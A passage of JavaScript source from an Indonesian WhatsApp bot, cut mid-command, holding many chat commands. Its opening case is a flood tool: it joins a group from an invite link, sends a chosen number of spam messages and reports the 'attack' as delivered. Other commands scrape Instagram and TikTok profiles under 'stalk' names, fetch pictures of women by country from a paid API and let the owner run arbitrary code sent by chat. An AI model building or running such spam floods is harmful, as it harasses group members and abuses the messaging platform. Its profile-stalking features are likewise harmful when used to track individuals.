if (!isCreator) return reply(mess.owner)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await fureya.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
fureya.sendMessage(mnm, { text: "Fureya Bug🔥" })
fureya.sendMessage(mnm, { text: "Fureya Bug🔥" } )
}
fureya.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb oziijywrdna`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": pp_bot, 
"mediaUrl": "https://youtube.com/@fauzijayawardana", 
"sourceUrl": "https://youtube.com/@fauzijayawardana" }}}, { quoted: m })
}
break

        case 'igstalk': {
            if (!args[0]) throw `✳️ Masukkan Nama Pengguna Instagram\n\n📌Contoh: ${prefix + command} nanzone` 
            reply(mess.wait)
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
▢ *🔖Nama:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Pengikut:* ${res.followersH}
▢ *🫂Mengikuti:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await fureya.sendFile(m.chat, res.profilePic, 'igstalk.png', te, m)
      } catch {
        m.reply(`*Error* Pastikan nama pengguna berasal dari *Instagram*`)
      } 
        }
        break
        
        case 'ttstalk': {
          if (!args[0]) throw `✳️ Masukkan Nama Pengguna pengguna TikTok`
          reply(mess.wait)
try {
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
▢ *🔖Nama:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥Pengikut:* ${res.followers}
▢ *🫂Mengikuti:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
  await fureya.sendFile(m.chat, res.profile, 'tt.png', txt, m)
} catch {
    m.reply(`*ERROR* Periksa apakah nama pengguna berasal dari *TikTok*`)
        }
        }
        break
        
        case 'brainly':
        case 'brnly': {
        if (!text) throw m.reply(`Masukkan textnya!\n\n*Contoh:* ${prefix + command} 5 dikali 5`)
try {
  var apii2 = await fetch(`https://mfarels.my.id/api/brainly?q=${text}`)
  var js2 = await apii2.json()
  m.reply(js2.result)
} catch(e) {
  try {
    var apii = await fetch(`https://mfarels.my.id/api/brainly?q=${text}`)
    var js = await apii.json()
    m.reply(js.data.data)
  } catch(e) {
    m.reply(e)
  }
}
        }
        break
        
        case 'wikipedia': {
        if (!text) throw `✳️ Masukkan apa yang ingin Anda cari di Wikipedia` 
	
    try {
	const link =  await axios.get(`https://wikipedia.org/wiki/${text}`)
	m.reply('searching...')
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	m.reply(`≻ *Wikipedia*

‣ Buscado : ${wik}

${resulw}`)
} catch (e) {
  m.reply('⚠️ Tidak ada hasil yang ditemukan ')
}
        }
        break
        
        case 'translate': {
        let err = `
📌 *Contoh:*

*${prefix + command}* <bahasa> [text]
*${prefix + command}* id Hello World

≡ *Daftar bahasa yang didukung:* 

https://cloud.google.com/translate/docs/languages
`.trim()

    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text

    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       m.reply(result.text)
    } catch (e) {
        throw err
    }  
        }
        break
      
      
      //cecan
      case 'china':
      case 'vietnam':
      case 'thailand':
      case 'indonesia':
      case 'korea':
      case 'japan':
      case 'malaysia':
      case 'justinaxie':
      case 'jeni':
      case 'jiso':
      case 'ryujin':
      case 'rose':
      case 'hijaber': {
          let api1 = `https://api.betabotz.org/api/cecan/${command}?apikey=${ziiii}`
    let api2 = `https://api.betabotz.org/api/cecan/${command}?apikey=${ziiii}`
    m.reply(mess.wait)
    let buffer = await fetch(api1)
        .then(res => res.buffer())
        .catch(async (err) => {
            console.log(`API 1 failed with error: ${err}. Trying API 2...`)
            buffer = await fetch(api2).then(res => res.buffer())
            return buffer
        })
    fureya.sendFile(m.chat, buffer, 'hasil.jpg', `Random ${command}`, m)
      }
      break
      
      case 'aiimg': {
            if (!isCreator) return m.reply(mess.owner)
			if (!text) return reply(`Example: ${prefix + command} owl`)
			reply(mess.wait)
			let buffer = await fetch(`https://api.betabotz.org/api/maker/text2img?text=${text}&apikey=${ziiii}`)
			fureya.sendMessage(from, { image: buffer, caption:`nihh`}, { quoted:m })
			}
			break 

      case 'limit': case 'balance':
      case 'ceklimit': case 'cekbalance':
			    if (mentioned.length !== 0){
					var Ystatus = ownerNumber.includes(mentioned[0])
					var isPrim = Ystatus ? true : _prem.checkPremiumUser(mentioned[0], premium)
				    var ggcount = isPrim ? gcounti.prem : gcounti.user
                    var limitMen = `${getLimit(mentioned[0], limitCount, limit)}`
                    textImg(`Limit : ${_prem.checkPremiumUser(mentioned[0], premium) ? 'Unlimited' : limitMen}/${limitCount}\nLimit Game : ${cekGLimit(mentioned[0], ggcount, glimit)}/${ggcount}\nBalance : $${getBalance(mentioned[0], balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                } else {
                    var limitPrib = `${getLimit(sender, limitCount, limit)}/${limitCount}`
                    textImg(`Limit : ${isPremium ? 'Unlimited' : limitPrib}\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                }
				break
	  
	  	case 'rules': {
            let rules = `
*RULES*`
let rulesnya = `
1. Jangan Pernah Spam Bot
2. Jangan Call Nomer Bot
3. Jangan Mengeksploitasi Bot

Sanksi : *Warn/Soft Block*

*About Questions*

You : Bot Nya Slow Respon
Bot : Mohon Bersabar, Mungkin
Kendala Dari Jaringan, Signal,
Atau Bahkan Terbanned Dari
Pihak WhatsApp

You : Dapet Script Nya Dimana?
Bot : https://wa.me/6289528652225

You : Boleh Masukin Ke Grup Saia
Tidak?
Bot : Untuk Masalah Memasukkan
Bot Ke Dalam Grup Bisa
Menghubungi Owner

You: Apakah Bot Ini Masih
Menyimpan File Yang Saya Kirim?
Bot : Data WhatsApp Anda Hanya
Tersimpan Saat Bot Aktif, Dan Bot
Tidak Pernah Menyimpan File-file
Yang Anda Kirim

You : Min, Ada Fitur Yang Error
Bot : Jika Menemukan Bug/Error
Silahkan Langsung Hubungi
Owner/Creator Agar Segera Di Fix

Tetap Patuhi Rules Agar Tetap
Bisa Menikmati Bot

*Note* : Segala Ketentuan Dan
Kebijakan Yang Berlaku Di Pegang
Oleh Owner Bot, Sewaktu-Waktu
Owner Berhak Memakai Ataupun
Mengubah Kebijakan Dan
Ketentuan Yang Berlaku

*Thanks* Buat Kalian
User-User Yang Sudah Memakai Bot,
Yang Sudah Mau Mematuhi
Rules, Serta Para Constributor
Yang Sudah Membantu Dalam
Pembuatan Bot Ini
Ini`
      	  
                let buttonMessage = {
                    image: thumb,
                    caption: `${rules}\n${rulesnya}\n\n*${footer_text}*`,
                    footer: `${namaowner}`,
                    headerType: 4
                }
                fureya.sendMessage(m.chat, buttonMessage, { quoted: uzii })
        }
        break 

        default:
            if (budy.startsWith(">")) {
                if (!isCreator) return;
                try {
                    let evaled = await eval(budy.slice(2));
                    if (typeof evaled !== "string")
                        evaled = require("util").inspect(evaled);
                    await reply(evaled);
                } catch (err) {
                    await reply(util.format(err));
                }
            }
        }
    } catch (err) {
        m.reply(util.format(err));
    }
};

/**
  * Created by Fauzijywrdna
  * Contact me on WhatsApp wa.me/6289528652225 
  * Subscribe me on Youtube : https://youtube.com/@fauzijayawardana
  
  * If you want to buy an updated script that is not encrypted, please WhatsApp me
*/

/**
INGAT BANG , INI SCRIPT GRATIS BUAT SEMUA ORANG , JANGAN DI JUAL!! JIKA SCRIPT DI JUAL NERAKA MENUNGGUMU!! 

SCRIPT ORI BUATAN FAUZII!!
*/